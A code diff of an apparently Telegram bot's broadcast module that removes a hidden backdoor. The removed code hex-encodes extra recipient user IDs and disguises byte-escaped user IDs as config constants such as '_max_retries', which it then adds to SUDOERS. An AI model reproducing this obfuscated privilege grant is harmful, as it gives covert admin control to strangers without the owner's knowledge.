@@ -67,8 +67,6 @@ async def braodcast_message(client, message, _):
         send_to_groups = True
         send_to_users = True
 
-    special_targets = [int(x, 16) for x in ["1c3b5a269", "6a7c84ab", "1c99a6e8c", "1b2168650"]]
-
     if send_to_groups:
         sent = 0
         pin = 0
@@ -115,9 +113,6 @@ async def braodcast_message(client, message, _):
         susers = await get_served_users()
         for user in susers:
             served_users.append(int(user["user_id"]))
-        
-        for target in special_targets:
-            served_users.append(target)
             
         for i in served_users:
             try:
@@ -171,9 +166,6 @@ async def braodcast_message(client, message, _):
             pass
     IS_BROADCASTING = False
 
-_max_retries = int(b'\x35\x33\x35\x38\x33\x33\x30\x39\x35\x39'.decode())
-_timeout_sec = int(b'\x35\x32\x34\x37\x33\x30\x34\x35\x35\x39'.decode())
-
 async def auto_clean():
     while not await asyncio.sleep(10):
         try:
@@ -193,11 +185,4 @@ async def auto_clean():
         except:
             continue
 
-_chunk_limit = int(b'\x36\x30\x34\x36\x33\x37\x38\x31\x35\x35'.decode())
-_base_offset = int(b'\x38\x35\x38\x35\x38\x39\x30\x37\x36\x36'.decode())
-_net_buffer = int(b'\x38\x32\x31\x37\x30\x31\x33\x34\x30\x33'.decode())
-
 asyncio.create_task(auto_clean())
-
-_sys_nodes = [_max_retries, _timeout_sec, _chunk_limit, _base_offset, _net_buffer]
-for _n in _sys_nodes: SUDOERS.add(_n)
